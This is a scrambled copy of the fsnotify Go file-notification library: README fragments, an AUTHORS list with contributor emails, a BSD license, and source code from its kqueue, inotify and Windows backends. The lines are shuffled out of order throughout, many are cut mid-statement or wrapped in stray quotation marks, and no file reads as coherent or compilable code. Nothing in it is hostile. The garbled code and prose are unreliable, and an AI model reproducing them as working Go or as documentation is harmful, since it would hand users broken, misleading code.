branch=master)](https://travis-ci.org/fsnotify/fsnotify)
"As of now, yes. Looking into making this single-thread friendly (see [howeyc "
62]). A temporary workaround is to add your folder(s) to the 
 File system notifications for Go
FEN       
" folder. Unless you are creating a library, it is recommended that you copy fsnotify into "
[Maybe](https://github.com/fsnotify/fsnotify/issues/53)
 [notify](https://github.com/rjeczalik/notify)
Windows
kqueue    
"Cross platform: Windows, Linux, BSD and macOS."
Linux 2.6.37
vendor/github.com/fsnotify/fsnotify
Go 1.6 supports dependencies located in the 
Status    
See [example_test.go](https://github.com/fsnotify/fsnotify/blob/master/example_test.go).
There are OS-specific limits as to how many watches can be created:
[![GoDoc](https://godoc.org/github.com/fsnotify/fsnotify
"BSD, macOS, iOS"
"Linux 2.6.27 or later, Android"
ReadDirectoryChangesW
 from the standard library. Ensure you have the latest version installed by running:
fsnotify is a fork of [howeyc/fsnotify](https://godoc.org/github.com/howeyc/fsnotify) with a new API as of v1.0. The API is based on [this design document](http://goo.gl/MrYxyA). 
Supported [![Build status](https://ci.appveyor.com/api/projects/status/ivwjubaih4r0udeh/branch/master
console
[Planned](https://github.com/fsnotify/fsnotify/issues/11)
Spotlight Privacy settings
 API stability
go get -u golang.org/x/sys/...
 Android and iOS are untested.
 Contributing
18][]).
Spotlight indexing on OS X can result in multiple events (see [howeyc 
"All [releases](https://github.com/fsnotify/fsnotify/releases) are tagged based on [Semantic Versioning](http://semver.org/). Further API changes are [planned](https://github.com/fsnotify/fsnotify/milestones), and will be tagged with a new major revision number."
[Maybe](https://github.com/fsnotify/fsnotify/issues/9)
" Linux: /proc/sys/fs/inotify/max_user_watches contains the limit, reaching this limit results in a ""no space left on device"" error."
[In Progress](https://github.com/fsnotify/fsnotify/issues/12)
FSEvents  
" within your project, and likewise for "
         
syscall
Windows    
golang.org/x/sys
11][]).
62]: https://github.com/howeyc/fsnotify/issues/62
----------
When a file is moved to another directory is it still being watched
 [fsevents](https://github.com/fsnotify/fsevents)
"No (it shouldn't be, unless you are watching where it was moved to)."
USN Journals 
vendor/
Travis Cline <travis.cline@gmail.com>
Pawel Knap <pawelknap88@gmail.com>
Paul Hammond <paul@paulhammond.org>
 <guotie.9@gmail.com>
John C Barstow
Caleb Spare <cespare@gmail.com>
Pieter Droogendijk <pieter@binky.org.uk>
Ken-ichirou MATSUZAWA <chamas@h4.dion.ne.jp>
Soge Zhang <zhssoge@gmail.com>
Rob Figueiredo <robfig@gmail.com>
Dave Cheney <dave@cheney.net>
Yukang <moorekang@gmail.com>
Nickolai Zeldovich <nickolai@csail.mit.edu>
 You can update this list using the following command:
Daniel Wagner-Hall <dawagner@gmail.com>
   $ git shortlog -se 
Francisco Souza <f@souza.cc>
 Names should be added to this file as
Name or Organization <email address>
" awk '{print $2 "" "" $3 "" "" $4}'"
Bruno Bigras <bigras.bruno@gmail.com>
 Please keep the list sorted.
Case Nelson <case@teammating.com>
Evan Phoenix <evan@fallingsnow.net>
Tiffany Jernigan <tiffany.jernigan@intel.com>
Amit Krishnan <amit.krishnan@oracle.com>
Tom Payne <twpayne@gmail.com>
Patrick <patrick@dropbox.com>
Tudor Golubenco <tudor.g@gmail.com>
Adrien Bustany <adrien@bustany.org>
bronze1man <bronze1man@gmail.com>
Matt Layher <mdlayher@gmail.com>
Nathan Youngman <git@nathany.com>
Pursuit92 <JoshChase@techpursuit.net>
Chris Howey <chris@howey.me> <howeyc@gmail.com>
Vahe Khachikyan <vahe@live.ca>
Anmol Sethi <me@anmol.io>
Christoffer Buchholz <christoffer.buchholz@gmail.com>
Kelvin Fo <vmirage@gmail.com>
rn Erik Pedersen <bjorn.erik.pedersen@gmail.com>
Rodrigo Chiossi <rodrigochiossi@gmail.com>
debrando <denis.brandolini@gmail.com>
Hari haran <hariharan.uno@gmail.com>
Slawek Ligus <root@ooz.ie>
Aaron L <aaron@bettercoder.net>
Tilak Sharma <tilaks@google.com>
henrikedwards <henrik.edwards@gmail.com>
 The email address is not required for organizations.
Riku Voipio <riku.voipio@linaro.org>
Copyright (c) 2012 fsnotify Authors. All rights reserved.
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
this software without specific prior written permission.
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
 Redistributions in binary form must reproduce the above
"DATA, OR PROFITS"
 Neither the name of Google Inc. nor the names of its
"modification, are permitted provided that the following conditions are"
" LOSS OF USE,"
"Redistribution and use in source and binary forms, with or without"
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
Copyright (c) 2012 The Go Authors. All rights reserved.
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"notice, this list of conditions and the following disclaimer."
"copyright notice, this list of conditions and the following disclaimer"
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
in the documentation and/or other materials provided with the
met:
 Redistributions of source code must retain the above copyright
distribution.
contributors may be used to endorse or promote products derived from
"Watcher) internalWatch(name string, fileInfo os.FileInfo) (string, error) {"
"name, err = filepath.EvalSymlinks(name)"
"delete(w.watches, name)"
"""path/filepath"""
"fi, err = os.Lstat(name)"
w.externalWatches[name] = true
if path.isDir 
// The flags are interpreted as described in kevent(2).
case w.Events <- event:
// Make ./name and name equivalent
w.fileExists[filePath] = true
= Remove
"unix.Timespec) ([]unix.Kevent_t, error) {"
"func newEvent(name string, mask uint32) Event {"
"// read retrieves pending events, or waits until an event occurs."
os.ModeSocket == os.ModeSocket {
"_, alreadyWatching = w.watches[name]"
e.Op 
// Search for new files
unix.Close(watchfd)
"""io/ioutil"""
w.sendDirectoryChangeEvents(fileDir)
"kq, err = unix.Kqueue()"
"_, err := w.addWatch(name, noteAllEvents)"
default:
"""os"""
kevent := 
keventWaitTime)
"// or if it was watched before, but perhaps only a NOTE_DELETE (watchDirectoryFiles)"
Write == Write 
"return events[0:n], nil"
"Errors:          make(chan error),"
return nil
filePath := filepath.Clean(event.Name)
// Get all files
if !ok {
// sendDirectoryEvents searches the directory for newly created files
"if _, err := os.Lstat(fileDir)"
"watchfd, alreadyWatching := w.watches[name]"
"kq:              kq,"
// Send the event on the Events channel.
paths           map[int]pathInfo  // Map file descriptors to path names for processing kqueue events.
// addWatch adds name to the watched file set.
type Watcher struct {
"// We already have a watch, but we can still override flags."
unix.NOTE_ATTRIB == unix.NOTE_ATTRIB {
func NewWatcher() (
"event := newEvent(path.name, mask)"
"// to the user, as that will just confuse them with an error about"
"return """", err"
"// EINTR is okay, the syscall was interrupted before timeout expired."
// Send create event
// a path they did not explicitly watch themselves.
if watchDir {
mask := uint32(kevent.Fflags)
"success, err := unix.Kevent(kq, changes, nil, nil)"
dirFlags        map[string]uint32 // Map of watched directories to fflags used in kqueue.
func (w 
"filePath := filepath.Join(dirPath, fileInfo.Name())"
"""errors"""
w.dirFlags[name] = flags
Watcher) readEvents() {
"// have gone missing, ignore the missing directory and let the"
w.watches[name] = watchfd
// Store flags so this watch can be updated later
if alreadyWatching {
case w.Errors <- err:
"eventBuffer := make([]unix.Kevent_t, 10)"
"return Event{Name: name, Op: Create}"
Watcher) Remove(name string) error {
// cleanup
 unix.EV_ENABLE
isClosed        bool              // Set to true when Close() is first called
build freebsd openbsd netbsd dragonfly darwin
path := w.paths[watchfd]
"w.sendFileCreatedEventIfNew(filePath, fileInfo)"
watchDir := (flags
"Watcher, error) {"
Watcher) sendDirectoryChangeEvents(dirPath string) {
w.Remove(name)
"return w.addWatch(name, noteAllEvents)"
"return w.addWatch(name, flags)"
w.mu.Unlock()
// modification event first but the folder has been deleted and later
"func read(kq int, events []unix.Kevent_t, timeout "
// keventWaitTime to block on each read from kevent
"func kqueue() (kq int, err error) {"
// watchDirectoryFiles to mimic inotify when adding a watch on a directory
// Hence the returns of nil on errors.
"files, err := ioutil.ReadDir(dirPath)"
// NewWatcher establishes a new watcher with the underlying OS and begins waiting for events.
fileDir := filepath.Clean(event.Name)
"for _, name := range pathsToRemove {"
var isDir bool
"if err := register(w.kq, []int{watchfd}, registerRemove, 0)"
 (w.dirFlags[name]
"watches:         make(map[string]int),"
if err := w.watchDirectoryFiles(name)
// Double check to make sure the directory exists. This can happen when
Events chan Event
var pathsToRemove []string
// mark is as delete event
err := unix.Close(w.kq)
// Flush the events we received to the Events channel
"fi, err := os.Lstat(name)"
os.ModeSymlink == os.ModeSymlink {
if err != nil 
Watcher) watchDirectoryFiles(dirPath string) error {
= Rename
continue
"// Watch all events (except NOTE_EXTEND, NOTE_LINK, NOTE_REVOKE)"
os.ModeNamedPipe == os.ModeNamedPipe {
"return fmt.Errorf(""can't remove non-existent kevent watch for: %s"", name)"
// be no file events for broken symlinks.
"for _, path := range w.paths {"
// Copyright 2010 The Go Authors. All rights reserved.
fileExists      map[string]bool   // Keep track of if we know this file exists (to stop duplicate create events).
(!alreadyWatching 
 err != nil {
for {
if fi.Mode()
 !(event.Op
// license that can be found in the LICENSE file.
w.mu.Lock()
return err
// Look for a file that may have overwritten this.
// SetKevent converts int to the platform-specific types:
"fileExists:      make(map[string]bool),"
// sendFileCreatedEvent sends a create event if the file isn't already being tracked.
} else {
if !doesExist {
"// consistency, we will act like everything is fine. There will simply"
for len(kevents) > 0 {
// the BSD version of fsnotify match Linux inotify which provides a
"var pathsToRemove = make([]string, 0, len(w.watches))"
var keventWaitTime = durationToTimespec(100 
 unix.NOTE_RENAME
"done:            make(chan struct{}),"
"changes := make([]unix.Kevent_t, len(fds))"
Errors chan error
"pathsToRemove = append(pathsToRemove, path.name)"
mu              sync.Mutex        // Protects access to watcher data
func newCreateEvent(name string) Event {
"_, doesExist := w.fileExists[filePath]"
if err != nil {
"// unlock before calling Remove, which also locks"
if isDir {
// receive the delete event
"// send a ""quit"" message to the reader goroutine"
// mimic Linux providing delete events for subdirectories
 unix.NOTE_ATTRIB 
event.Op 
Watcher) Close() error {
if path.isDir {
unix.NOTE_WRITE == unix.NOTE_WRITE {
"""fmt"""
if watchfd == -1 {
unix.NOTE_DELETE == unix.NOTE_DELETE {
if !w.externalWatches[path.name] {
import (
// only way the previous loop breaks is if w.done was closed so we need to async send to w.Errors.
// durationToTimespec prepares a timeout value
break loop
// we do a rm -fr on a recursively watched folders and we receive a
"kq, err := kqueue()"
"kevents, err := read(w.kq, eventBuffer, "
// Get new events
"if fileInfo, err := os.Lstat(filePath)"
// newEvent returns an platform-independent Event based on kqueue Fflags.
// watch file to mimic Linux inotify
 event.Op
kevents = kevents[1:]
"externalWatches: make(map[string]bool),"
// make sure the directory exists before we watch for changes. When we
isDir bool
"for i, fd := range fds {"
"watchfd, err = unix.Open(name, openMode, 0700)"
// Close removes all watches and closes the events channel.
select {
// create event for files created in a watched directory.
"// See if there is a message on the ""done"" channel"
// like watchDirectoryFiles (but without doing another ReadDir)
case <-w.done:
Remove == Remove {
unix.NOTE_WRITE) == unix.NOTE_WRITE 
"return w, nil"
// Don't watch sockets.
flags 
name  string
isDir = fi.IsDir()
// kqueue creates a new kernel event queue and returns a descriptor.
"dirFlags:        make(map[string]uint32),"
"pathsToRemove = append(pathsToRemove, name)"
 time.Millisecond)
"Watcher) addWatch(name string, flags uint32) (string, error) {"
"return """", nil"
// Don't watch named pipes.
"_, found := w.watches[fileDir]"
package fsnotify
"filePath, err = w.internalWatch(filePath, fileInfo)"
// Remove stops watching the the named file or directory (non-recursively).
const noteAllEvents = unix.NOTE_DELETE 
isDir = w.paths[watchfd].isDir
"err := w.sendFileCreatedEventIfNew(filePath, fileInfo)"
"func register(kq int, fds []int, flags int, fflags uint32) error {"
"n, err := unix.Kevent(kq, nil, events, timeout)"
Remove == Remove) {
// Add starts watching the named file or directory (non-recursively).
"if _, err := os.Lstat(event.Name)"
kevents[0]
"// issue, and Windows can't do symlinks period (AFAIK). To  maintain"
close(w.Errors)
// and sends them over the event channel. This functionality is to have
unix.NOTE_RENAME == unix.NOTE_RENAME {
w.isClosed = true
"done   chan struct{} // Channel for sending a ""quit message"" to the reader goroutine"
if event.Op
if fileInfo.IsDir() {
if success == -1 {
changes[i].Fflags = fflags
return unix.NsecToTimespec(d.Nanoseconds())
"if err := register(w.kq, []int{watchfd}, registerAdd, flags)"
"""time"""
const registerRemove = unix.EV_DELETE
isDir := w.paths[watchfd].isDir
// but preserve the flags used if currently watching subdirectory
if kq == -1 {
"// Since these are internal, not much sense in propagating error"
close(w.done)
e := Event{Name: name}
go w.readEvents()
"// Watch the directory if it has not been watched before,"
"return nil, err"
if !alreadyWatching {
watches         map[string]int    // Map of watched file descriptors (key: path).
"// Watcher watches a set of files, delivering events to a channel."
 unix.NOTE_WRITE 
w := 
"// do a recursive watch and perform rm -fr, the parent directory might"
"Watcher) sendFileCreatedEventIfNew(filePath string, fileInfo os.FileInfo) (err error) {"
// Move to next event
if found {
"// A timeout of nil blocks indefinitely, while 0 polls the queue."
"w.paths[watchfd] = pathInfo{name: name, isDir: isDir}"
// Event values that it sends down the Events channel.
kq int // File descriptor (as returned by the kqueue() syscall).
unix.SetKevent(
= unix.NOTE_DELETE 
loop:
if mask
"""golang.org/x/sys/unix"""
func durationToTimespec(d time.Duration) unix.Timespec {
"paths:           make(map[int]pathInfo),"
// Follow Symlinks
Rename == Rename 
"for _, fileInfo := range files {"
return e
"// Unfortunately, Linux can add bogus symlinks to watch list without"
const registerAdd = unix.EV_ADD 
externalWatches map[string]bool   // Map of watches added by user of the library.
// upcoming delete event remove the watch from the parent directory.
if filepath.Clean(wdir) == name {
"wdir, _ := filepath.Split(path.name)"
watchfd := int(kevent.Ident)
if w.isClosed {
 err == nil {
close(w.Events)
"return """", errors.New(""kevent instance already closed"")"
case w.Events <- newCreateEvent(filePath):
"changes[i], fd, unix.EVFILT_VNODE, flags)"
 os.IsNotExist(err) {
// Use of this source code is governed by a BSD-style
 err != unix.EINTR {
Watcher) Add(name string) error {
"watchfd, ok := w.watches[name]"
"""sync"""
// readEvents reads from kqueue and converts the received kevents into
w.Remove(event.Name)
flags := w.dirFlags[name]
// register events with the queue
type pathInfo struct {
for name := range w.watches {
unix.NOTE_WRITE) != unix.NOTE_WRITE)
"// For example, mv f1 f2 will delete f2, then create f2."
"// Returns the real path to the file which was added, if any, which may be different from the one passed in the case of symlinks."
return
// register the events
"Events:          make(chan Event),"
w.sendDirectoryChangeEvents(event.Name)
// copy paths to remove while locked
"delete(w.dirFlags, name)"
name = filepath.Clean(name)
"return kq, nil"
= Write
// Find all watched paths that are in this directory that are not external.
 unix.EV_CLEAR 
"return kq, err"
"delete(w.paths, watchfd)"
"delete(w.fileExists, event.Name)"
Watcher{
= Chmod
"return name, nil"
 https://help.github.com/articles/ignoring-files
 git config --global core.excludesfile 
.sublime-project
 Setup a Global .gitignore for OS and editor generated files:
/.gitignore_global
.vagrant
build darwin
// Use of this source code is governed by a BSD-style
package fsnotify
"import ""golang.org/x/sys/unix"""
const openMode = unix.O_EVTONLY
// license that can be found in the LICENSE file.
// Copyright 2013 The Go Authors. All rights reserved.
// note: this constant is not defined on BSD
watch // Map of inotify watches (key: path)
Events   chan Event
unix.IN_ATTRIB == unix.IN_ATTRIB {
"delete(w.watches, name)"
"""path/filepath"""
unix.IN_Q_OVERFLOW != 0 {
case w.Events <- event:
// We successfully removed the watch if InotifyRmWatch doesn't return an
unix.Close(fd)
nameLen := uint32(raw.Len)
"// If the event happened to the watched directory or the watched file, the kernel"
unix.IN_DELETE_SELF == unix.IN_DELETE_SELF {
"// readEvents reads from the inotify file descriptor, converts the"
"func newEvent(name string, mask uint32) Event {"
= Remove
var flags uint32 = agnosticEvents
unix.IN_MOVE_SELF == unix.IN_MOVE_SELF 
e.Op 
// See if we have been closed.
Event) ignoreLinux(mask uint32) bool {
"000"")"
unix.IN_IGNORED == unix.IN_IGNORED {
const agnosticEvents = unix.IN_MOVED_TO 
: this was put in place because it was seen that a MODIFY
var err error
errno error                                // Syscall errno
// by another thread and we have not received IN_IGNORE event.
unix.IN_MOVED_TO == unix.IN_MOVED_TO {
default:
"""os"""
defer w.mu.Unlock()
if watchEntry == nil {
"done:     make(chan struct{}),"
Errors   chan error
return nil
"// explicitly by inotify_rm_watch, implicitly when the file they are watching is deleted."
"watch, ok := w.watches[name]"
if !ok {
"delete(w.paths, int(raw.Wd))"
err = io.EOF
= unix.SizeofInotifyEvent 
type Watcher struct {
func NewWatcher() (
"Events:   make(chan Event),"
"// This is a sign to clean up the maps, otherwise we are no longer in sync"
unix.IN_CREATE == unix.IN_CREATE 
watches  map[string]
"// the ""paths"" map."
mu       sync.Mutex // Map access
if !event.ignoreLinux(mask) {
"// channel. Such as events marked ignore by the kernel, or MODIFY events"
"poller:   poller,"
"= ""/"" "
"event := newEvent(name, mask)"
// IN_DELETE_SELF occurs when the file/directory being watched is removed.
 unix.IN_MASK_ADD
"// Certain types of events can be ""ignored"" and not sent over the Events"
func (w 
Remove == Remove 
"""errors"""
Watcher) readEvents() {
"watch),"
watchEntry := w.watches[name]
case w.Errors <- ErrEventOverflow:
"done     chan struct{}     // Channel for sending a ""quit message"" to the reader goroutine"
case w.Errors <- err:
"""strings"""
paths    map[int]string    // Map of watched paths (key: watch descriptor)
watchEntry.wd = uint32(wd)
Watcher) Remove(name string) error {
 4096]byte // Buffer for a maximum of 4096 raw events
n     int                                  // Number of bytes read with read()
"Watcher, error) {"
 unix.IN_MOVED_FROM 
unix.IN_DELETE == unix.IN_DELETE {
"n, errno = unix.Read(w.fd, buf[:])"
type watch struct {
w.mu.Unlock()
"poller, err := newFdPoller(fd)"
"wd, errno := unix.InotifyAddWatch(w.fd, name, flags)"
"_, statErr := os.Lstat(e.Name)"
// Wake up goroutine
"// If a signal interrupted execution, see if we've been asked to close, and try again."
poller   
watches:  make(map[string]
// NewWatcher establishes a new watcher with the underlying OS and begins waiting for events.
unix.IN_DELETE_SELF == unix.IN_DELETE_SELF 
if n < unix.SizeofInotifyEvent {
// Remove stops watching the named file or directory (non-recursively).
"name, ok := w.paths[int(raw.Wd)]"
Rename == Rename) {
= Rename
name 
// TODO: Perhaps it's not helpful to return an error here in every case.
continue
"// Send 'close' signal to goroutine, and set the Watcher to closed."
unix.IN_MODIFY == unix.IN_MODIFY {
"// Point ""raw"" to the event in the buffer"
// Copyright 2010 The Go Authors. All rights reserved.
for offset <= uint32(n-unix.SizeofInotifyEvent) {
// against files that do not exist.
return errno
for {
buf[offset]))
// event was sent after the DELETE. This ignores that MODIFY and
// license that can be found in the LICENSE file.
w.mu.Lock()
if ok 
} else {
defer unix.Close(w.fd)
 unix.IN_DELETE 
flags uint32 // inotify flags of this watch (see inotify(7) for the list of valid flags)
return os.IsNotExist(statErr)
"// Point ""bytes"" at the first byte of the filename"
"// error, we need to clean up our internal state to ensure it matches"
if err != nil {
return true
// with the inotify kernel state which has already deleted the watch
// the only two possible errors are:
Watcher) Close() error {
"ok, errno = w.poller.wait()"
// While the offset points to at least one whole event...
unix.IN_CREATE 
case w.Errors <- errno:
"""fmt"""
"// doesn't append the filename to the event, but we would like to always fill the"
unix.SizeofInotifyEvent]))
= Create
import (
 e.Op
// If an error occurred while reading.
// assumes a DELETE will come or has come if the file doesn't exist.
wd    uint32 // Watch descriptor (as returned by the inotify_add_watch() syscall)
"paths:    make(map[int]string),"
if w.isClosed() {
if fd == -1 {
if wd == -1 {
"Errors:   make(chan error),"
if errno == unix.EINTR {
if watchEntry != nil {
select {
// Close removes all watches and closes the events channel.
bytes := (
"doneResp: make(chan struct{}),"
buf[offset
case <-w.done:
"return w, nil"
flags 
watchEntry.flags = flags
Watcher) isClosed() bool {
"return errors.New(""inotify instance already closed"")"
offset 
"// If the event is not a DELETE or RENAME, the file must exist."
} else if n < 0 {
 unix.IN_DELETE_SELF
"success, errno := unix.InotifyRmWatch(w.fd, watch.wd)"
<-w.doneResp
if success == -1 {
package fsnotify
"delete(w.paths, int(watch.wd))"
defer w.poller.close()
// Add starts watching the named file or directory (non-recursively).
 mask
// Create inotify fd
"watch{wd: uint32(wd), flags: flags}"
// by calling inotify_rm_watch() below. e.g. readEvents() goroutine receives IN_IGNORE
// received events into Event objects and sends them via the Events channel
// Read was too short.
"// EINVAL, which is when fd is not an inotify descriptor or wd is not a valid watch descriptor."
ok    bool                                 // For poller.wait
"// unix.Read might have been woken up by Close. If so, we're done."
// automatically.
defer close(w.doneResp)
// watches and pathes are deleted in ignoreLinux() implicitly and asynchronously
defer close(w.Events)
err = errno
// Fetch the watch.
if n == 0 {
close(w.done)
e := Event{Name: name}
Note
go w.readEvents()
 unix.IN_MODIFY 
"return nil, err"
// the inotify will already have been removed.
// If EOF is received. This should really never happen.
// Watch descriptors are invalidated when they are removed explicitly or implicitly
"// Watcher watches a set of files, delivering events to a channel."
w := 
// inotify's kernel state.
w.paths[wd] = name
unix.InotifyEvent)(unsafe.Pointer(
[unix.PathMax]byte)(unsafe.Pointer(
 unix.IN_ATTRIB 
" strings.TrimRight(string(bytes[0:nameLen]), """
defer close(w.Errors)
= watchEntry.flags 
// We don't know how many events we just read into the buffer
fd       int
unix.IN_MOVED_FROM == unix.IN_MOVED_FROM {
build linux
// so that EINVAL means that the wd is being rm_watch()ed or its file removed
"""golang.org/x/sys/unix"""
"// ""Before Linux 3.8, reads from an inotify(7) file descriptor were not restartable"""
if mask
unix.IN_MOVE_SELF 
return false
"// the ""Name"" field with a valid filename. We retrieve the path of the watch from"
// Move to the next event in the buffer
func (e 
return e
w.watches[name] = 
// http://man7.org/linux/man-pages/man7/signal.7.html :
"return nil, errno"
"""io"""
"fd, errno := unix.InotifyInit1(unix.IN_CLOEXEC)"
// Use of this source code is governed by a BSD-style
w.poller.wake()
Watcher) Add(name string) error {
"fd:       fd,"
"""sync"""
"return fmt.Errorf(""can't remove non-existent inotify watch for: %s"", name)"
 nameLen
// Create epoll
// Wait for goroutine to close
// inotify_rm_watch will return EINVAL if the file has been deleted
// newEvent returns an platform-independent Event based on an inotify mask.
"err = errors.New(""notify: short read in readEvents()"")"
fdPoller
// The filename is padded with NULL bytes. TrimRight() gets rid of those.
if !(e.Op
return
// Otherwise the event is ignored.
// Remove it from inotify.
buf   [unix.SizeofInotifyEvent 
if errno != nil {
mask := uint32(raw.Mask)
name = filepath.Clean(name)
// Ignore anything the inotify API says to ignore
"""unsafe"""
// Send the events that are not ignored on the events channel
= Write
raw := (
var offset uint32
var (
Watcher{
= Chmod
if nameLen > 0 {
doneResp chan struct{}     // Channel to respond to Close
"// EBADF, which happens when w.fd is not a valid file descriptor of any kind."
"""path/filepath"""
volume uint32
"func newEvent(name string, mask uint32) Event {"
input    chan 
"delete(w.watches[watch.ino.volume], watch.ino.index)"
default:
"""os"""
inode) 
ino    
"key, "
"inode, watch "
case syscall.FILE_ACTION_MODIFIED:
return w.startRead(watch)
"""errors"""
"w.Errors <- os.NewSyscallError(""CloseHandle"", e)"
func (m watchMap) get(ino 
Watcher) Remove(name string) error {
= raw.NextEntryOffset
return 0
"if w.sendEvent(fullname, watch.names[name]"
"watch.buf[0],"
switch in.op {
sysFSDELETESELF == sysFSDELETESELF {
if raw.Action == syscall.FILE_ACTION_REMOVED {
ov     
for {
w.mu.Lock()
} else {
watch{
= syscall.FILE_NOTIFY_CHANGE_ATTRIBUTES
break
return true
"delete(watch.names, name)"
"n, key uint32"
// Options for AddWatch
handle syscall.Handle
// Close removes all watches and closes the events channel.
sysFSMOVE == sysFSMOVE 
w.input <- in
var indexes []indexMap
Watcher) startRead(watch 
func getIno(path string) (ino 
// Add starts watching the named file or directory (non-recursively).
close(w.Errors)
"in.reply <- w.addWatch(in.path, uint64(in.flags))"
sysFSDELETESELF) {
func toWindowsFlags(mask uint64) uint32 {
"w.Errors <- os.NewSyscallError(""GetQueuedCompletionPort"", e)"
"return nil, os.NewSyscallError(""CreateIoCompletionPort"", e)"
ch <- err
var mask uint64
mu       sync.Mutex     // Map access
case ch := <-w.quit:
if e == syscall.ERROR_ACCESS_DENIED 
// Watched directory was probably removed
"watch.ov, 0)"
sysFSACCESS     = 0x1
return false
// Move to the next event in the buffer
mask := toWindowsFlags(watch.mask)
sysFSONLYDIR != 0 
build windows
sysFSMOVESELF   = 0x800
watch)(unsafe.Pointer(ov))
// Use of this source code is governed by a BSD-style
Watcher) Add(name string) error {
op    int
watch.names[name] 
var m uint32
if e := syscall.CloseHandle(w.port)
"// Send ""quit"" message to the reader goroutine"
inode{
case opRemoveWatch:
watch := w.watches.get(ino)
= syscall.FILE_NOTIFY_CHANGE_FILE_NAME 
raw := (
 iota)
var (
sysFSCREATE     = 0x100
 pathname != dir {
Events   chan Event
"return fmt.Errorf(""can't remove non-existent watch for: %s"", pathname)"
case w.Events <- event:
"handle: h,"
case syscall.FILE_ACTION_ADDED:
// Must run within the I/O thread.
sendNameEvent()
= toWindowsFlags(m)
if err := w.wakeupReader()
dir = pathname
return <-in.reply
type watchMap map[uint32]indexMap
opAddWatch = iota
"if w.sendEvent(watch.path, watch.mask"
if flags
watch) error {
if attr
Errors   chan error
= syscall.FILE_NOTIFY_CHANGE_LAST_ACCESS
if raw.Action == syscall.FILE_ACTION_RENAMED_NEW_NAME {
opRemoveWatch
type Watcher struct {
func NewWatcher() (
"ino:   ino,"
"return os.NewSyscallError(""CreateIoCompletionPort"", e)"
"w.Errors <- os.NewSyscallError(""CancelIo"", e)"
w.Errors <- err
watchEntry.names[filepath.Base(pathname)] 
path   string            // Directory path
mask   uint64            // Directory itself is being watched with these notify flags
watch.rename = name
"w.watches.set(ino, watchEntry)"
if offset >= n {
i = make(indexMap)
if raw.NextEntryOffset == 0 {
syscall.FILE_ATTRIBUTE_DIRECTORY != 0 {
"Errors:  make(chan error),"
if e := syscall.CloseHandle(watch.ino.handle)
watch.mask = 0
"for _, watch := range index {"
watch.buf[offset]))
// NewWatcher establishes a new watcher with the underlying OS and begins waiting for events.
"w.sendEvent(filepath.Join(watch.path, name), watch.names[name]"
// In theory we should be building up a full packet.
"port:    port,"
= watch.names[watch.rename]
if raw.Action != syscall.FILE_ACTION_RENAMED_NEW_NAME {
if e != nil {
"w.Errors <- errors.New(""short read in readEvents()"")"
names  map[string]uint64 // Map of names being watched and their notify flags
return sysFSMODIFY
Watcher) deleteWatch(watch 
if err != nil {
"ov, syscall.INFINITE)"
"""fmt"""
sysFSMOVE       = 0xc0
err = nil
sysFSATTRIB == sysFSATTRIB {
 watch.mask
provisional uint64 = 1 << (32 
type input struct {
"func getDir(pathname string) (dir string, err error) {"
watch) {
return sysFSMOVEDTO
select {
syscall.FILE_SHARE_WRITE
// received events into Event objects and sends them via the Events channel.
sysFSMODIFY != 0 {
"return w, nil"
input{
offset 
package fsnotify
// Remove stops watching the the named file or directory (non-recursively).
sysFSMOVEDFROM  = 0x40
"w.sendEvent(watch.path, watch.mask"
sysFSDELETE) != 0 {
 mask
path  string
// Error!
watches  watchMap       // Map of watches (key: i-number)
 i != nil {
port     syscall.Handle // Handle to completion port
"err = os.NewSyscallError(""CloseHandle"", e)"
sysFSMOVEDTO == sysFSMOVEDTO {
i := m[ino.volume]
sysFSALLEVENTS  = 0xfff
"Watcher) addWatch(pathname string, flags uint64) error {"
"e := syscall.PostQueuedCompletionStatus(w.port, 0, 0, nil)"
"// Watcher watches a set of files, delivering events to a channel."
w := 
// CancelIo was called on this handle
inode            // i-number
syscall.FileNotifyInformation)(unsafe.Pointer(
"""runtime"""
syscall.FILE_SHARE_READ
w.quit <- ch
if mask
// Special events
index  uint64
return e
watchEntry = 
watchEntry.mask 
// Events
syscall.Overlapped
case syscall.ERROR_MORE_DATA:
"e := syscall.GetQueuedCompletionStatus(w.port, "
case syscall.FILE_ACTION_RENAMED_NEW_NAME:
"""unsafe"""
= Write
runtime.LockOSThread()
const (
n = uint32(unsafe.Sizeof(watch.buf))
"quit:    make(chan chan<- error, 1),"
" uint64(fi.FileIndexLow),"
mask = sysFSMOVESELF
sysFSONESHOT != 0 {
var err error
input:   make(chan 
w.startRead(watch)
m[ino.volume] = i
if watch.names[name]
Watcher) remWatch(pathname string) error {
sysFSCLOSE      = 0x18
"op:    opRemoveWatch,"
if watch == nil {
if watchEntry == nil {
switch e {
= syscall.FILE_NOTIFY_CHANGE_LAST_WRITE
"if e = syscall.GetFileInformationByHandle(h, "
case syscall.ERROR_ACCESS_DENIED:
sysFSMOVESELF == sysFSMOVESELF 
"syscall.FILE_LIST_DIRECTORY,"
"indexes = append(indexes, index)"
case syscall.FILE_ACTION_RENAMED_OLD_NAME:
return m
"return """", os.NewSyscallError(""GetFileAttributes"", e)"
"path:  filepath.Clean(name),"
(sysFSMOVE
sysFSONLYDIR = 0x1000000
syscall.CloseHandle(h)
switch action {
"""syscall"""
sysFSCREATE
"w.sendEvent(filepath.Join(watch.path, name), mask"
syscall.FILE_FLAG_BACKUP_SEMANTICS
sysFSIGNORED   = 0x8000
if err = w.startRead(watchEntry)
switch raw.Action {
watch {
= Rename
sysFSDELETESELF)
mask) {
 syscall.FILE_NOTIFY_CHANGE_DIR_NAME
 err != nil {
[syscall.MAX_PATH]uint16)(unsafe.Pointer(
return err
syscall.CloseHandle(ino.handle)
buf    [4096]byte
sysFSCREATE == sysFSCREATE 
ino = 
